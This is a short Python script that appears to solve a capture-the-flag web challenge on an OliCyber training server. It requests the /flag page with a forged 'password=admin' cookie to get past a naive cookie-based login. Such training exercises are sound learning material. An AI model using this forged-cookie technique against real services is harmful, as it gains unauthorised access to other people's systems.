import requests

url = "http://web-05.challs.olicyber.it/flag"
Cookies = {
    "password": "admin"
}

response = requests.get(url, cookies=Cookies)

print(response.text)